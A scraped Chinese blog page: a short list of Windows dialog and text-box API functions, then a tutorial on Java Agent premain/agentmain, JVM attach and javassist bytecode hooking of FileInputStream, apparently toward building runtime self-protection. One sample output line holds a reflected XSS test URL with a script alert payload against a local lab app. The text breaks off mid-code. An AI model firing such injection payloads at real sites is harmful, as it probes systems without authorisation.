              <time title="Created: 2020-07-08 22:18:33 / Modified: 22:28:52" itemprop="dateCreated datePublished" datetime="2020-07-08T22:18:33+08:00">2020-07-08</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>读取文本框的函数：</p>
<table>
<thead>
<tr>
<th>16位</th>
<th>32位（ANSI版）</th>
<th>32位（Unicode版）</th>
</tr>
</thead>
<tbody><tr>
<td>GetDlgItemText</td>
<td>GetDlgItemTextA</td>
<td>GetDlgItemTextW</td>
</tr>
<tr>
<td>GetWindowText</td>
<td>GetWindowTextA</td>
<td>GetWindowTextW</td>
</tr>
</tbody></table>
<p>显示窗口的函数：</p>
<p>MessageBoxA(W)、MessageBoxExA(W)、DialogBoxParamA(W)、ShowWindow、CreateWindowExA(W)</p>
<p>对话框函数：</p>
<p>DialogBoxParam（打开对话框）、EndDialog（关闭对话框）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://github.com/s0nnse/2020/06/13/Java%E6%8E%A2%E9%92%88-Java-Agent%E6%8A%80%E6%9C%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="s0nnse">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="s0nnse">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/06/13/Java%E6%8E%A2%E9%92%88-Java-Agent%E6%8A%80%E6%9C%AF/" class="post-title-link" itemprop="url">Java探针-Java Agent技术</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2020-06-13 09:23:12 / Modified: 13:45:39" itemprop="dateCreated datePublished" datetime="2020-06-13T09:23:12+08:00">2020-06-13</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="什么是探针"><a href="#什么是探针" class="headerlink" title="什么是探针"></a>什么是探针</h4><p>首先我们需要了解什么是探针，探针能做什么？</p>
<p>这里我们只涉及应用探针，它是一个用于捕获、分析应用执行情况，应用执行过程的组件。探针是一个与应用相互独立的程序，可以用来分析应用的执行情况，改变应用的执行逻辑等。</p>
<p>在Java体系中Java探针是基于JavaAgent和Java字节码注入技术的，使用Java探针技术可以在加载类的时候，对字节码进行修改。常见的有</p>
<ul>
<li><p>springCloud自带了这些功能</p>
</li>
<li><p>asm、javassist技术</p>
</li>
<li><p>springboot的Actuator扩展</p>
</li>
</ul>
<p>接下来我们将依次分析JavaAgent和Java字节码两种技术</p>
<h4 id="JavaAgent原理分析"><a href="#JavaAgent原理分析" class="headerlink" title="JavaAgent原理分析"></a>JavaAgent原理分析</h4><p>我们在Idea和Eclipse中调试java代码的时候其实使用的就是JavaAgent技术</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"C:\Program Files\Java\jdk1.8.0_251\bin\java.exe" -agentlib:jdwp=transport=dt_socket,address=127.0.0.1:1708,suspend=y,server=n -javaagent:C:\Users\***\AppData\Local\JetBrains\IntelliJIdea2020.1\captureAgent\debugger-agent.jar -Dfile.encoding=UTF-8 -classpath "C:\Program...</span><br></pre></td></tr></table></figure>

<p>这里需要关注<code>-javaagent:</code>参数，这就是Idea调试技术的关键。</p>
<p>先说一下它的用途，在JDK1.5以后，我们可以使用agent技术构建一个独立于应用程序的代理程序（即为Agent），用来协助监测、运行甚至替换其他JVM上的程序。使用它可以实现虚拟机级别的AOP功能。</p>
<p>Agent分为两种，一种是在主程序之前运行的Agent即premain，一种是在主程序之后运行的Agent即agentmain（前者的升级版，1.6以后提供），下面我们写个例子演示进行演示。</p>
<p>首先写个主程序</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">example</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"This is main here"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h5 id="在主程序运行之前的代理程序"><a href="#在主程序运行之前的代理程序" class="headerlink" title="在主程序运行之前的代理程序"></a>在主程序运行之前的代理程序</h5><p>接着写一个Agent程序，注意这里Agent和主程序是两个不同的项目，Agent程序中可以不用写main函数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> testagent;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Agent</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String args, Instrumentation instrumentation)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"This is premain here"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码只有一个premain方法，它代表着在主程序的main方法之前运行，args代表传递过来的参数inst则是agent技术主要使用的API，我们可以使用它来改变和重新定义类的行为。这里我们简单的进行一下打印。这里推荐使用maven进行打包，当然也可以使用其它的。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Premain-class</span>&gt;</span>testagent.Agent<span class="tag">&lt;/<span class="name">Premain-class</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>主要关注的是<code>&lt;Premain-class&gt;</code>，这里需要添加Agent程序的类名</p>
<p>我们分别打包主程序和Agent程序，运行一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">E:\myrasp\testforasp\myagent\target&gt;java -javaagent:myagent-0.0.1-jar-with-dependencies.jar -jar mytest-0.0.1-jar-with-dependencies.jar</span><br><span class="line">This is premain here</span><br><span class="line">This is main here</span><br></pre></td></tr></table></figure>

<p>这里<code>-javaagent</code>后设置agent程序，<code>-jar</code>后设置主程序，可以看到，我们Jar包中premain方法中的的代码在主函数运行之前就已经成功运行了！</p>
<h5 id="在主程序运行之后的代理程序"><a href="#在主程序运行之后的代理程序" class="headerlink" title="在主程序运行之后的代理程序"></a>在主程序运行之后的代理程序</h5><p>在主程序运行之前的agent模式有一些缺陷，例如需要在主程序运行前就指定javaagent参数，premain方法中代码出现异常会导致主程序启动失败等，为了解决这些问题，JDK1.6以后提供了在程序运行之后改变程序的能力。它的实现步骤和之前的模式类似</p>
<p>编写一个agent程序</p>
<p>我们复用上面的Agent程序，这次需要写一个agentmain方法，由于是在主程序运行后再执行，意味着我们可以获取主程序运行时的信息，这里我们打印出来主程序中加载的类名。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String args, Instrumentation instrumentation)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"This is agentmain here"</span>);</span><br><span class="line">        Class&lt;?&gt;[] classes = instrumentation.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class&lt;?&gt; cls : classes) &#123;</span><br><span class="line">            System.out.println(cls.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"agent run complete"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>打包之前需要修改一下pom.xml文件，添加<code>Agent-class</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Agent-class</span>&gt;</span>testagent.Agent<span class="tag">&lt;/<span class="name">Agent-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Premain-class</span>&gt;</span>testagent.Agent<span class="tag">&lt;/<span class="name">Premain-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifestEntries</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>启动主程序，接下来还需要编写加载agent类的程序</p>
<p>在程序运行后加载，我们不可能在主程序中编写加载的代码，只能另写程序，那么另写程序如何与主程序进行通信？这里用到的机制就是attach机制，它可以将JVM A连接至JVM B，并发送指令给JVM B执行，JDK自带常用工具如jstack，jps等就是使用该机制来实现的。</p>
<p>这里需要先修改下主程序，需要让主程序可以阻塞，要不然主程序运行后立即就结束了，无法进行attach操作。修改的主程序后打包运行，让主程序阻塞在那</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">example</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"This is main here"</span>);</span><br><span class="line">        BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(System.in ));</span><br><span class="line">        String read = <span class="keyword">null</span>;</span><br><span class="line">        System.out.print(<span class="string">"输入数据："</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            read = br.readLine();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"输入数据："</span>+read);</span><br><span class="line">        System.out.println(<span class="string">"main run complete"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>接着编写attch程序</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.tools.attach.AgentInitializationException;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.AgentLoadException;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.AttachNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">attach</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"This is attach here"</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            VirtualMachine vm = VirtualMachine.attach(<span class="string">"2416"</span>);</span><br><span class="line">            vm.loadAgent(<span class="string">"E:\\myrasp\\testforasp\\myagent\\target\\myagent-0.0.1-jar-with-dependencies.jar"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AttachNotSupportedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AgentLoadException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AgentInitializationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：写这段代码的时候 IDE 可能提示找不到 jar 包，这时候将 jdk/lib/tools.jar 添加的项目的 classpath 中。</p>
<p>我们使用VirtualMachine attach到目标进程，其中2416为主程序进程的PID，可以使用jps命令获得</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">E:\myrasp\testforasp&gt;jps</span><br><span class="line">2416 jar</span><br><span class="line">11784 RemoteMavenServer36</span><br><span class="line">16456</span><br><span class="line">8284 Jps</span><br></pre></td></tr></table></figure>

<p>也可以使用VirtualMachine.list方法获取本机上所有的Java进程，再来判断java进程，loadAgent方法第一个参数为之前Agent的Jar包在本机中的路径，第二个参数为传入agentmain的args参数，此处为null，运行attach程序</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">E:\myrasp\testforasp\mytest\target&gt;java -jar mytest-0.0.1-jar-with-dependencies.jar</span><br><span class="line">This is main here</span><br><span class="line">输入数据：This is agentmain here</span><br><span class="line">testagent.Agent</span><br><span class="line">example</span><br><span class="line">sun.reflect.DelegatingMethodAccessorImpl</span><br><span class="line">sun.reflect.NativeMethodAccessorImpl</span><br><span class="line">sun.instrument.InstrumentationImpl$1</span><br><span class="line">java.lang.Package</span><br><span class="line">sun.misc.URLClassPath$FileLoader</span><br><span class="line">java.util.concurrent.ConcurrentHashMap$ForwardingNode</span><br><span class="line">[Lsun.instrument.TransformerManager$TransformerInfo;</span><br><span class="line">sun.instrument.TransformerManager$TransformerInfo</span><br><span class="line">sun.instrument.TransformerManager</span><br><span class="line">sun.instrument.InstrumentationImpl</span><br></pre></td></tr></table></figure>

<p>可以看到，agentmain方法中的代码已经在主程序中顺利运行了，并且打印出了程序中加载的类，agentmain的使用实际上会更复杂，但之后丰富Java探针的时候主要使用premain的方法，就不在赘述。</p>
<p>以上是是Java Agent的俩个简单的例子，Java Agent十分强大，它能做到的不仅仅是打印几个监控数值而已，还包括使用Transformer等高级功能进行类替换，方法修改等，要使用Instrumentation的相关API则需要对字节码等技术有较深的认识。</p>
<h4 id="动态字节码原理分析"><a href="#动态字节码原理分析" class="headerlink" title="动态字节码原理分析"></a>动态字节码原理分析</h4><p>Java动态字节码主要使用了JVM TI接口进行实现，  JVMTI(JVM Tool Interface) 位于jpda 最底层， 是Java 虚拟机所提供的native编程接口。 JVMTI可以提供性能分析、debug、内存管理、线程分析等功能。</p>
<p>首先再次对主程序进行修改，让主程序去读取一个文件，并打印其中的内容</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">example</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"This is main here"</span>);</span><br><span class="line">        String path = <span class="string">"E:\\myrasp\\url.txt"</span>;</span><br><span class="line">        readTxtFile(path);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">readTxtFile</span><span class="params">(String filePath)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String encoding=<span class="string">"GBK"</span>;</span><br><span class="line">            File file=<span class="keyword">new</span> File(filePath);</span><br><span class="line">            <span class="keyword">if</span>(file.isFile() &amp;&amp; file.exists())&#123; <span class="comment">//判断文件是否存在</span></span><br><span class="line">                InputStreamReader read = <span class="keyword">new</span> InputStreamReader(</span><br><span class="line">                        <span class="keyword">new</span> FileInputStream(file),encoding);<span class="comment">//考虑到编码格式</span></span><br><span class="line">                BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(read);</span><br><span class="line">                String lineTxt = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">while</span>((lineTxt = bufferedReader.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    System.out.println(lineTxt);</span><br><span class="line">                &#125;</span><br><span class="line">                read.close();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                System.out.println(<span class="string">"找不到指定的文件"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(<span class="string">"读取文件内容出错"</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先运行一下看下没用agent情况下的执行结果</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">E:\myrasp\testforasp\mytest\target&gt;java -jar mytest-0.0.1-jar-with-dependencies.jar</span><br><span class="line">This is main here</span><br><span class="line">./catalina.sh jpda start</span><br><span class="line">http://127.0.0.1:8080/java-sec-code-1.0.0/xss/reflect?xss=%3Cscript%3Ealert(1)%3C/script%3E</span><br></pre></td></tr></table></figure>

<p>我们知道，我们编写的 Java 代码都是要被编译成字节码后才能放到 JVM 里执行的，而字节码一旦被加载到虚拟机中，就可以被解释执行。</p>
<h5 id="javassist"><a href="#javassist" class="headerlink" title="javassist"></a>javassist</h5><p>字节码文件（.class）就是普通的二进制文件，它是通过 Java 编译器生成的。而只要是文件就可以被改变，如果我们用特定的规则解析了原有的字节码文件，对它进行修改或者干脆重新定义，这不就可以改变代码行为了么。</p>
<p>Java 生态里有很多可以动态生成字节码的技术，像 BCEL、Javassist、ASM、CGLib 等，它们各有自己的优势。有的使用复杂却功能强大、有的简单确也性能些差。这里我们使用javassist进行演示，因为使用javassist编写代码比较简单。</p>
<p>这里编写一个修改字节码的类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> testagent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.UnmodifiableClassException;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassTransformer</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Instrumentation instrumentation;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ClassTransformer</span><span class="params">(Instrumentation instrumentation)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.instrumentation = instrumentation;</span><br><span class="line">        instrumentation.addTransformer(<span class="keyword">this</span>, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">retransform</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Class[] loadedClasses = instrumentation.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class clazz : loadedClasses) &#123;</span><br><span class="line">            <span class="keyword">if</span> (instrumentation.isModifiableClass(clazz) &amp;&amp; !clazz.getName().startsWith(<span class="string">"java.lang.invoke.LambdaForm"</span>)) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    instrumentation.retransformClasses(clazz);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (UnmodifiableClassException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="string">"java/io/FileInputStream"</span>.equals(className)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(className);</span><br><span class="line">        String loadName = className.replace(<span class="string">"/"</span>, <span class="string">"."</span>);</span><br><span class="line">        CtClass ctClass = <span class="keyword">null</span>;</span><br><span class="line">        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ctClass = classPool.makeClass(<span class="keyword">new</span> ByteArrayInputStream(classfileBuffer));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String checkSqlSrc = getInvokeStaticSrc(ClassTransformer.class, "checkReadFile", "$1", File.class);</span><br><span class="line">            CtBehavior ctMethod = ctClass.getConstructor(<span class="string">"(Ljava/io/File;)V"</span>);</span><br><span class="line">            ctMethod.insertBefore(checkSqlSrc);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (CannotCompileException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (CannotCompileException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkReadFile</span><span class="params">(File file)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"is method checkReadFile"</span>);</span><br><span class="line">        System.out.println(file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getInvokeStaticSrc</span><span class="params">(Class invokeClass, String methodName, String paramString, Class... parameterTypes)</span> </span>&#123;</span><br><span class="line">        String src;</span><br><span class="line">        String invokeClassName = 